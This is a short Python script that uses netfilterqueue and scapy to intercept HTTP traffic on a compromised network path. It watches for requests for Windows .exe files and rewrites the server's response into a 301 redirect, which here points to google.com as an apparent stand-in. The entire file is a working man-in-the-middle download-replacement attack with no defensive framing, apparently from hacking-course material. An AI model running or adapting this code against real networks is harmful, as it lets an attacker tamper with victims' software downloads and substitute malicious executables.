#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ack_list = [] # List to store the ACK numbers

def set_load(packet, load): # Function to set the payload of a packet
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].dlen
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # Get the packet payload
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80: # Check if the packet is a request
            print("[+] HTTP Request")
            if ".exe" in str(scapy_packet[scapy.Raw].load) and "172.16.74.12" not in str(scapy_packet[scapy.IP].dst): # Check if the request is for a Windows executable
                print("[+] Windows executable request")
                ack_list.append(scapy_packet[scapy.TCP].ack) # Store the ACK number
        elif scapy_packet[scapy.TCP].sport == 80:  # Check if the packet is a response
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.google.com/\n\n") # Modify the packet payload

                packet.set_payload(str(modified_packet)) # Set the modified packet payload



    packet.accept() # Accept the packet
    


    
queue = netfilterqueue.NetfilterQueue() # Create a NetfilterQueue object
queue.bind(0, process_packet) # Bind the queue to the process_packet function
queue.run() # Start the queue

